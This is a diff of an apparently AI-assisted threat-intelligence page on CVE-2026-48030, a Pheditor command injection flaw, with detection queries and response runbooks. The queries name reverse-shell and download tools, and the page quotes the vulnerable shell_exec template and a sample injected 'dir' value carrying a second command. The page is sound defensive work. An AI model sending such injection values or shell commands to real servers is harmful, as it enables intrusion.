@@ -22371,14 +22371,14 @@ level: medium
 </details></div>
 </article>
 <article class="card" id="art-100" data-art-slug="2026-06-09-ghsa-critical-cve-2026-48030-pheditor-os-command-injection-i"
-  data-phases="actions,c2,exploit,install,recon" data-sev="crit"
+  data-phases="actions,c2,delivery,exploit,install,recon" data-sev="crit"
   data-techs="T1190"
   data-sources="GitHub Security Advisories"
   data-platforms="datadog,def,falcon,sent,sigma,spl"
-  data-splunk-cats="application,endpoint,network,web"
+  data-splunk-cats="application,endpoint,web"
   data-targets="linux,vcs,windows"
-  data-uc-count="6" data-llm-uc-count="4"
-  data-search="[GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal handler via unsanitized &#x27;dir&#x27; parameter Pheditor: OS Command Injection in terminal handler via unsanitized &#x27;dir&#x27; parameter CVE-2026-48030 T1190 [LLM] Pheditor CVE-2026-48030 — web server spawning shell interpreter from terminal handler RCE [LLM] Pheditor CVE-2026-48030 — shell metacharacters in &#x27;dir&#x27; POST parameter to pheditor.php [LLM] Pheditor CVE-2026-48030 — webshell drop: PHP / web account writing .php to webroot [LLM] Pheditor CVE-2026-48030 — vulnerable Pheditor 2.0.1–2.0.3 asset inventory exposure Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han">
+  data-uc-count="7" data-llm-uc-count="5"
+  data-search="[GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal handler via unsanitized &#x27;dir&#x27; parameter Pheditor: OS Command Injection in terminal handler via unsanitized &#x27;dir&#x27; parameter CVE-2026-48030 T1190 [LLM] Web server process spawning shell interpreter (Pheditor CVE-2026-48030 RCE) [LLM] HTTP POST to pheditor.php with shell metacharacters in dir parameter [LLM] PHP worker writing executable webshell to webroot (Pheditor RCE persistence) [LLM] Pheditor CVE-2026-48030 vulnerable-version asset inventory [LLM] Pheditor authenticated terminal POST followed by web-server account egress Asset exposure — vulnerability matches article CVE(s) Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han">
   <div class="sev-ribbon crit">Critical</div>
   <button class="share-btn card-share" data-share-art="2026-06-09-ghsa-critical-cve-2026-48030-pheditor-os-command-injection-i" title="Copy share link to this article" aria-label="Copy share link">
     <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
@@ -22387,9 +22387,9 @@ level: medium
   <div class="source-badges"><span class="source-badge ">GitHub Security Advisories</span></div>
   <div class="pubmeta">
     <span>2026-06-09</span>
-    <span>6 use cases</span>
+    <span>7 use cases</span>
     <span>1 technique</span>
-    <span>4 kill-chain phases detected</span>
+    <span>6 kill-chain phases detected</span>
   </div>
   <p class="summary">Pheditor: OS Command Injection in terminal handler via unsanitized &#x27;dir&#x27; parameter</p>
   <div class="ind-group"><span class="ind-label">CVEs</span><span class="ind cve">CVE-2026-48030</span></div>
@@ -22410,10 +22410,10 @@ level: medium
   <div class="name">Weaponization</div>
   <div class="marker">—</div>
 </div>
-<div class="kc-cell ">
+<div class="kc-cell hit">
   <div class="num">Phase 3</div>
   <div class="name">Delivery</div>
-  <div class="marker">—</div>
+  <div class="marker">Detected</div>
 </div>
 <div class="kc-cell hit">
   <div class="num">Phase 4</div>
@@ -22425,45 +22425,45 @@ level: medium
   <div class="name">Installation</div>
   <div class="marker">Detected</div>
 </div>
-<div class="kc-cell inferred">
+<div class="kc-cell hit">
   <div class="num">Phase 6</div>
   <div class="name">Command &amp; Control</div>
-  <div class="marker">Likely</div>
+  <div class="marker">Detected</div>
 </div>
 <div class="kc-cell hit">
   <div class="num">Phase 7</div>
   <div class="name">Actions on Objectives</div>
   <div class="marker">Detected</div>
 </div></div>
-  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ [LLM] Pheditor CVE-2026-48030 — vulnerable Pheditor 2.0.1–2.0.3 asset inventory exposure · Asset exposure — vulnerability matches article CVE(s)</em></div>
+  <div class="kc-detail"><div class="phase-line hit"><strong>Reconnaissance.</strong> Attacker researches the target — OSINT, scanning, enumeration. <em>→ [LLM] Pheditor CVE-2026-48030 vulnerable-version asset inventory · Asset exposure — vulnerability matches article CVE(s)</em></div>
 <div class="phase-line "><strong>Weaponization.</strong> Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).</div>
-<div class="phase-line "><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).</div>
-<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] Pheditor CVE-2026-48030 — shell metacharacters in &#x27;dir&#x27; POST parameter to pheditor.php</em></div>
-<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] Pheditor CVE-2026-48030 — web server spawning shell interpreter from terminal handler RCE · [LLM] Pheditor CVE-2026-48030 — webshell drop: PHP / web account writing .php to webroot · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han</em></div>
-<div class="phase-line inferred"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking.</div>
+<div class="phase-line hit"><strong>Delivery.</strong> Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). <em>→ [LLM] HTTP POST to pheditor.php with shell metacharacters in dir parameter</em></div>
+<div class="phase-line hit"><strong>Exploitation.</strong> Triggering the exploit — vulnerability/macro/trust abuse to execute code. <em>→ [LLM] Web server process spawning shell interpreter (Pheditor CVE-2026-48030 RCE)</em></div>
+<div class="phase-line hit"><strong>Installation.</strong> Establishing persistence on the host — backdoor, service, scheduled task, registry key. <em>→ [LLM] PHP worker writing executable webshell to webroot (Pheditor RCE persistence) · Article-specific behavioural hunt — [GHSA / CRITICAL] CVE-2026-48030: Pheditor: OS Command Injection in terminal han</em></div>
+<div class="phase-line hit"><strong>Command &amp; Control.</strong> Beacon to attacker infrastructure for control and tasking. <em>→ [LLM] Pheditor authenticated terminal POST followed by web-server account egress</em></div>
 <div class="phase-line hit"><strong>Actions on Objectives.</strong> Lateral movement, credential dumping, data theft, ransomware, sabotage.</div></div>
 </div>
-  <div class="usecases"><details class="uc" data-uc-slug="935bb80a80" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows" open>
+  <div class="usecases"><details class="uc" data-uc-slug="5514fcc77e" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows" open>
   <summary>
-    <span class="uc-title">Pheditor CVE-2026-48030 — web server spawning shell interpreter from terminal handler RCE</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
+    <span class="uc-title">Web server process spawning shell interpreter (Pheditor CVE-2026-48030 RCE)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="935bb80a80" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="5514fcc77e" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects PHP-FPM / Apache / Nginx (or php-cgi) processes spawning sh/bash/dash under web service account context (www-data, apache, nginx). This is the post-exploitation footprint of the unsanitized &#x27;dir&#x27; POST parameter in pheditor.php executing arbitrary OS commands via shell_exec().
+    <div class="uc-desc">Hunts the core exploit behavior of CVE-2026-48030 — a PHP-FPM/Apache/Nginx worker spawning sh/bash/dash under www-data/apache/nginx context. Pheditor&#x27;s terminal handler reaches shell_exec() with attacker-injected $dir, producing this exact parent→child chain.
 
-Rationale: Article states &#x27;achieving full Remote Code Execution with web server privileges&#x27; and PoC shows shell_exec() reaching sh via the cd-prefix injection from &#x27;dir&#x27;. Pivot is the parent/child pair (PHP→sh) under web account — the exact runtime footprint of the exploit. Cross-checked NVD CVE-2026-48030 advisory and CWE-78 OS command injection canonical patterns.
+Rationale: Article explicitly states `shell_exec((empty($dir) ? null : &#x27;cd &#x27; . $dir . &#x27; &amp;&amp; &#x27;) . $command . &#x27; &amp;&amp; echo \ ; pwd&#x27;)` runs as web server user (www-data per the PoC `id` output). The parent→child pair is the unavoidable runtime signature.
 
 Cross-checked against:
-  • https://github.com/advisories/GHSA-jvc5-6g7q-c843
-  • https://attack.mitre.org/techniques/T1059/004/
-  • https://cwe.mitre.org/data/definitions/78.html</div>
-    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+  • https://github.com/advisories/GHSA-jvc5-6g7q-c843</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Unix Shell">T1059.004</span> <span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
     <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
-    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate site-management cron jobs run as www-data invoking shell helpers (e.g. WordPress wp-cron shelling out to mysqldump)</li><li>Composer install / npm postinstall scripts run under web user during deploy spawning bash to compile assets</li><li>Health-check scripts (Sensu, Datadog Agent) running as www-data executing /bin/sh probes</li><li>Legitimate Pheditor terminal commands the admin actually typed (ls, ps) reaching the same code path</li><li>Container init scripts in PHP base images where entrypoint is php-fpm and CMD launches bash</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessCommandLine has_any (&quot;/usr/local/bin/wp&quot;,&quot;composer.phar&quot;,&quot;datadog-agent&quot;,&quot;sensu-client&quot;,&quot;newrelic-daemon&quot;) and not(ProcessCommandLine has_any (&quot;curl &quot;,&quot;wget &quot;,&quot;echo &#x27;&lt;?php&quot;,&quot;/dev/tcp/&quot;)))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage — pull the full ProcessCommandLine and ParentProcessCommandLine; look for &#x27;pheditor.php&#x27; / &#x27;action=terminal&#x27; in the parent chain and the article&#x27;s IoC strings (cd &lt;path&gt;; curl, echo &#x27;&lt;?php&#x27;, /var/www/html/shell.php). Cross-reference web access logs for the same source IP hitting POST /pheditor.php within the prior 60s. 2) Contain — isolate the host via MDE Live Response or quarantine SG; revoke any pheditor admin credentials and rotate web-app session secret; block outbound from the web user to the attacker C2 IP. 3) Hunt — search DeviceFileEvents for .php writes under /var/www by web user (companion UC), DeviceNetworkEvents for outbound curl/wget egress, and AsepValueUpdate / crontab edits for persistence; pivot on the source IP across all internet-facing pheditor instances.</div></details>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate Pheditor terminal use where admin runs benign whitelisted commands (ls, pwd) — these still produce php→sh chain</li><li>Cron jobs configured to run as www-data invoking shell scripts</li><li>Composer/wp-cli invocations from PHP that legitimately shell out</li><li>Webhook/CI receivers (Jenkins agents, deploy scripts) that intentionally call sh from PHP</li><li>Sysadmin troubleshooting via su - www-data -s /bin/bash</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (ProcessCommandLine matches regex @&quot;^(/bin/sh|/bin/bash) -c \&quot;cd [a-zA-Z0-9/_.-]+ &amp;&amp; (ls|pwd|whoami|id|cat [a-zA-Z0-9/_.-]+) &amp;&amp; echo .* ; pwd\&quot;$&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">Step 1 (Triage): Pull the full ProcessCommandLine and InitiatingProcessCommandLine. Look for shell metacharacters (`;`, `|`, `` ` ``, `$()`) following `cd /` — Pheditor&#x27;s vulnerable template is `cd $dir &amp;&amp; $command &amp;&amp; echo \ ; pwd`. Pivot on DeviceName to fetch the originating HTTP POST in web access logs (look for action=terminal and the dir POST body).
+Step 2 (Contain): Block external access to /pheditor.php at the WAF or reverse proxy. Isolate the affected host. Kill the spawned shell PID and any persistent children (nc, python -c, php -S). Rotate any credentials reachable from the web server.
+Step 3 (Hunt): Search DeviceFileEvents for .php writes by php-fpm/apache to webroot in the last 30 days (webshell drop). Check DeviceNetworkEvents from the web-server account to public IPs for reverse-shell beacons. Confirm patch &gt;= 2.0.4 deployed; audit all Pheditor instances org-wide.</div></details>
     <div class="tabs">
       <button class="tab-btn active" data-target="art-100-uc0-kql">Defender KQL</button>
       <button class="tab-btn" data-target="art-100-uc0-sentinel">Sentinel KQL</button>
@@ -22474,33 +22474,34 @@ Cross-checked against:
     </div>
     <div class="tab-content active" id="art-100-uc0-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
 | where Timestamp &gt; ago(7d)
-| where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;)
+| where InitiatingProcessFileName in~ (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
 | where FileName in~ (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;)
-| where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;)
-| where ProcessCommandLine has_any (&quot;curl &quot;,&quot;wget &quot;,&quot;echo &#x27;&lt;?php&quot;,&quot;/dev/tcp/&quot;,&quot;; curl&quot;,&quot;|sh&quot;,&quot;| sh&quot;,&quot;|bash&quot;,&quot;| bash&quot;,&quot;cd /var/www&quot;,&quot;cd /tmp&quot;,&quot;nc -e&quot;,&quot;bash -i&quot;)
-   or InitiatingProcessCommandLine has &quot;pheditor&quot;
-| project Timestamp, DeviceName, AccountName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath
+| where InitiatingProcessAccountName in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;http&quot;)
+| where ProcessCommandLine has_any (&quot;cd /&quot;, &quot;pheditor&quot;, &quot;; curl&quot;, &quot;; wget&quot;, &quot;| curl&quot;, &quot;| wget&quot;, &quot;`&quot;, &quot;$(&quot;, &quot;&gt;&gt;&quot;, &quot;&lt;&lt;&quot;)
+   or InitiatingProcessCommandLine has &quot;pheditor.php&quot;
+| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, FolderPath
 | order by Timestamp desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
+    <div class="tab-content" id="art-100-uc0-sentinel"><pre><button class="copy-btn">COPY</button><code>Syslog
 | where TimeGenerated &gt; ago(7d)
-| where ParentProcessName has_any (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
-| where ActingProcessName has_any (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;)
-| where ActorUsername in~ (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;)
-| where ActingProcessCommandLine has_any (&quot;curl &quot;,&quot;wget &quot;,&quot;echo &#x27;&lt;?php&quot;,&quot;/dev/tcp/&quot;,&quot;|sh&quot;,&quot;| sh&quot;,&quot;|bash&quot;,&quot;| bash&quot;,&quot;cd /var/www&quot;,&quot;cd /tmp&quot;,&quot;nc -e&quot;,&quot;bash -i&quot;)
-   or ParentProcessCommandLine has &quot;pheditor&quot;
-| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ParentProcessCommandLine, ActingProcessName, ActingProcessCommandLine
+| where Facility in (&quot;auth&quot;,&quot;authpriv&quot;,&quot;daemon&quot;,&quot;user&quot;)
+| where SyslogMessage has_any (&quot;php-fpm&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;) and SyslogMessage has_any (&quot;/bin/sh&quot;,&quot;/bin/bash&quot;,&quot;/bin/dash&quot;)
+| where SyslogMessage has_any (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;)
+| where SyslogMessage has_any (&quot;pheditor&quot;,&quot;curl &quot;,&quot;wget &quot;,&quot;; cd &quot;,&quot;|sh&quot;,&quot;`&quot;,&quot;$(&quot;)
+| project TimeGenerated, Computer, ProcessName, SyslogMessage
 | order by TimeGenerated desc</code></pre></div>
-    <div class="tab-content" id="art-100-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Web Server Process Spawning Shell Interpreter as Web Service Account
-id: 7d8a4f12-9b3e-4c7a-a8d2-1e5f6c9b2a3d
-description: PHP-FPM / Apache / Nginx spawning sh / bash / dash under www-data, apache, nginx etc. — core post-exploit behaviour of CVE-2026-48030 Pheditor &#x27;dir&#x27; parameter command injection and other PHP RCE classes.
+    <div class="tab-content" id="art-100-uc0-sigma"><pre><button class="copy-btn">COPY</button><code>title: Web Server Process Spawning Shell Interpreter (Pheditor CVE-2026-48030)
+id: 5b1a7f4c-9d2e-4c5a-8f1b-3a7e6d4c9b21
+description: Detects PHP-FPM/Apache/Nginx workers spawning sh/bash/dash under web-server user context — the runtime signature of Pheditor&#x27;s vulnerable terminal handler reaching shell_exec() with unsanitized dir parameter.
 references:
   - https://github.com/advisories/GHSA-jvc5-6g7q-c843
-author: Detection Engineering
-date: 2026/06/12
+author: SOC Detection Engineering
+date: 2026/06/16
 tags:
-  - attack.t1059.004
   - attack.t1190
+  - attack.t1059.004
   - attack.execution
+  - attack.initial_access
+  - cve.2026.48030
 logsource:
   category: process_creation
   product: linux
@@ -22509,7 +22510,6 @@ detection:
     ParentImage|endswith:
       - &#x27;/php-fpm&#x27;
       - &#x27;/php&#x27;
-      - &#x27;/php-cgi&#x27;
       - &#x27;/apache2&#x27;
       - &#x27;/httpd&#x27;
       - &#x27;/nginx&#x27;
@@ -22519,7 +22519,6 @@ detection:
       - &#x27;/bash&#x27;
       - &#x27;/dash&#x27;
       - &#x27;/ash&#x27;
-      - &#x27;/zsh&#x27;
   selection_user:
     User:
       - &#x27;www-data&#x27;
@@ -22527,127 +22526,124 @@ detection:
       - &#x27;nginx&#x27;
       - &#x27;nobody&#x27;
       - &#x27;httpd&#x27;
-      - &#x27;_www&#x27;
   condition: selection_parent and selection_child and selection_user
 level: high</code></pre></div>
-    <div class="tab-content" id="art-100-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.executable.path:(*/sh OR */bash OR */dash OR */ash) @user.name:(www-data OR apache OR nginx OR nobody OR httpd OR _www) (@process.command_line:*pheditor* OR @process.command_line:*curl* OR @process.command_line:*wget* OR @process.command_line:*&quot;/dev/tcp/&quot;* OR @process.command_line:*&quot;echo &#x27;&lt;?php&quot;* OR @process.command_line:*&quot;bash -i&quot;*)</code></pre></div>
-    <div class="tab-content" id="art-100-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2
-| ParentBaseFileName=/^(php-fpm|php|php-cgi|apache2|httpd|nginx)/i
-| ImageFileName=/\/(sh|bash|dash|ash|zsh)$/i
-| UserName=/^(www-data|apache|nginx|nobody|httpd|_www|wwwrun)$/i
-| CommandLine=/(curl |wget |\/dev\/tcp\/|echo &#x27;&lt;\?php|cd \/var\/www|cd \/tmp|\|\s*(sh|bash)|bash -i|nc -e|pheditor)/i
+    <div class="tab-content" id="art-100-uc0-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.parent.name:(php-fpm OR php OR apache2 OR httpd OR nginx) @process.name:(sh OR bash OR dash) @user.name:(www-data OR apache OR nginx OR nobody)</code></pre></div>
+    <div class="tab-content" id="art-100-uc0-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/(php-fpm|php|apache2|httpd|nginx)$/i
+| ImageFileName=/(sh|bash|dash|ash)$/i
+| UserName=/(www-data|apache|nginx|nobody|httpd)/i
+| regex(&quot;(pheditor|;\\s*curl|;\\s*wget|\\$\\(|`)&quot;, field=CommandLine, strict=false)
 | groupBy([aid, ComputerName, UserName, ParentBaseFileName, ImageFileName, CommandLine], function=count())</code></pre></div>
-    <div class="tab-content" id="art-100-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;) AND Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | where match(process,&quot;(?i)(curl|wget|cd /tmp|cd /var/www|echo &#x27;&lt;\?php|;\s*(curl|wget|nc|bash|sh)|\|\s*(sh|bash)|/dev/tcp/)&quot;) OR match(parent_process,&quot;(?i)pheditor\.php&quot;) | convert ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-100-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php-cgi&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;) AND Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;) AND Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;_www&quot;,&quot;wwwrun&quot;) by Processes.dest Processes.user Processes.parent_process_name Processes.parent_process Processes.process_name Processes.process | `drop_dm_object_name(Processes)` | where match(process,&quot;(?i)(curl|wget|cd /tmp|cd /var/www|echo &#x27;&lt;\?php|;\s*(curl|wget|nc|bash|sh)|\|\s*(sh|bash)|/dev/tcp/)&quot;) OR match(parent_process,&quot;(?i)pheditor\.php&quot;) | convert ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+    <div class="tab-content" id="art-100-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-100-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-100-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-100-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;) Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;) Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;http&quot;) by host, Processes.user, Processes.parent_process_name, Processes.parent_process, Processes.process_name, Processes.process | `drop_dm_object_name(Processes)` | where NOT match(process,&quot;^(/bin/sh|/bin/bash) -c (cd [^;&amp;|`$]+ &amp;&amp; [a-zA-Z0-9_-]+ &amp;&amp; echo)$&quot;) | `security_content_ctime(firstTime)`</code></pre><pre class="spl-mode-body" id="art-100-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.parent_process_name IN (&quot;php-fpm&quot;,&quot;php&quot;,&quot;php7.4&quot;,&quot;php8.0&quot;,&quot;php8.1&quot;,&quot;php8.2&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;) Processes.process_name IN (&quot;sh&quot;,&quot;bash&quot;,&quot;dash&quot;,&quot;ash&quot;,&quot;zsh&quot;) Processes.user IN (&quot;www-data&quot;,&quot;apache&quot;,&quot;nginx&quot;,&quot;nobody&quot;,&quot;httpd&quot;,&quot;http&quot;) by host, Processes.user, Processes.parent_process_name, Processes.parent_process, Processes.process_name, Processes.process | `drop_dm_object_name(Processes)` | where NOT match(process,&quot;^(/bin/sh|/bin/bash) -c (cd [^;&amp;|`$]+ &amp;&amp; [a-zA-Z0-9_-]+ &amp;&amp; echo)$&quot;) | `security_content_ctime(firstTime)`</code></pre></div></div>
   </div>
 </details>
-<details class="uc" data-uc-slug="9bd551b939" data-platforms="datadog,sent,sigma,spl" data-targets="vcs">
+<details class="uc" data-uc-slug="95e0603d33" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="vcs,windows">
   <summary>
-    <span class="uc-title">Pheditor CVE-2026-48030 — shell metacharacters in &#x27;dir&#x27; POST parameter to pheditor.php</span>
-    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
+    <span class="uc-title">HTTP POST to pheditor.php with shell metacharacters in dir parameter</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
     <span class="uc-conf high">High</span>
-    <button class="share-btn" data-share-uc="9bd551b939" title="Copy share link to this UC" aria-label="Copy share link">
+    <button class="share-btn" data-share-uc="95e0603d33" title="Copy share link to this UC" aria-label="Copy share link">
       <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
     </button>
   </summary>
   <div class="uc-body">
-    <div class="uc-desc">Detects HTTP POST requests to pheditor.php with action=terminal where the &#x27;dir&#x27; parameter (or surrounding body) carries shell metacharacters that bypass the TERMINAL_COMMANDS whitelist. Web access / WAF / reverse-proxy telemetry catches the exploit at the network ingress before the PHP process spawns the shell.
+    <div class="uc-desc">Network-layer detection for the CVE-2026-48030 exploitation vector. Flags POST requests to pheditor.php carrying action=terminal where the request body contains shell metacharacters (`;`, `|`, `` ` ``, `$(`) — the specific injection vehicle described in the advisory.
 
-Rationale: Article&#x27;s PoC Step 4 sends dir=/tmp; curl -s https://ifconfig.me # — the semicolon, pipe, backtick, $(, newline and &gt;&gt; set is the canonical OS-command-injection metachar list. POST to pheditor.php + action=terminal scope to the vulnerable endpoint, eliminating noise from GET-based feature use. WAF/proxy logs see the inbound request before PHP even spawns shell_exec. Validated against the GHSA advisory body and the CWE-78 / OWASP command-injection metachar catalogue.
